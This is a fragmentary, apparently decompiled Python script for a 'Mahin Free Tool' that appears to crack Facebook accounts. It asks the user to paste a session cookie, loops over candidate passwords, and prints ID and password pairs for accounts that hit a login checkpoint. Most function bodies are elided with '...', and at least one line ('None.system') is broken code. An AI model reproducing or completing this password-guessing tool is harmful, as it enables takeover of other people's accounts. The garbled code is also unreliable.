    ...
    for xd in range(10000):
        ...
        for x in range(10):
            ...
            def Subscraption():
                ...
                None.system('clear')
                print(logo)
                jalan('\n%s %s%s Cheaking Mahin Tool Subscription ......' % (P, M, P))
                time.sleep(4)
                os.system('clear')
                print(logo)
                print('')
...
def login_lagi334():
    ...
    print('-----------------------------------------------')
    jalan('\n%s %s%s Welcome To Mahin Free Tool.....' % (P, M, P))
    print('-----------------------------------------------')
    cookie = input('\n [+] Put Cookie : ')
    if cookie in ('get', 'Get'):
        os.system('xdg-open https://www.facebook.com/Mahinkhano71')
    loading()
...
def menu(my_name, my_id):
    ...
    print(logo)
    jalan('\n%s %s%s\x1b[1;32m              WELCOME  TO Mahin FREE TOOL ' % (P, M, P))
    ...
    for pw in pwv:
        ...
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                print(f'''\r\x1b[38;5;208m [Mahin-CP] {idf} | {pw}''')
